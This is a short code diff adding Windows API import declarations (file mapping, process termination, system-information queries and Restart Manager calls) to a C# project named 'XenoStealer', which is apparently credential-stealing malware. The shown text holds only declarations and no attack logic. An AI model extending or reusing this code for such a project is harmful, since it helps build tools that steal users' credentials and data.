@@ -4,6 +4,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using static XenoStealer.InternalStructs;
 
 namespace XenoStealer
 {
@@ -182,8 +183,39 @@ namespace XenoStealer
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         public static extern bool QueryFullProcessImageNameW(IntPtr hProcess, uint dwFlags, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpExeName, ref uint lpdwSize);
 
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern IntPtr CreateFileMappingA(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
+        
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool GetFileSizeEx(IntPtr hFile, out ulong FileSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtQuerySystemInformation(InternalStructs.SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength);
+
         [DllImport("kernel32.dll")]
         public static extern bool AllocConsole();
+
+        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern uint RmRegisterResources(uint dwSessionHandle, uint nFiles, string[] rgsFileNames, uint nApplications, RM_UNIQUE_PROCESS[] rgApplications, uint nServices, string[] rgsServiceNames);
+
+        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern uint RmStartSession(out uint pSessionHandle, uint dwSessionFlags, string strSessionKey);
+
+        [DllImport("rstrtmgr.dll", SetLastError = true)]
+        public static extern uint RmEndSession(uint pSessionHandle);
+
+        [DllImport("rstrtmgr.dll", SetLastError = true)]
+        public static extern uint RmGetList(uint dwSessionHandle, out uint pnProcInfoNeeded, ref uint pnProcInfo, [In, Out] RM_PROCESS_INFO[] rgAffectedApps, out InternalStructs.RM_REBOOT_REASON lpdwRebootReasons);
+
 
     }
 }
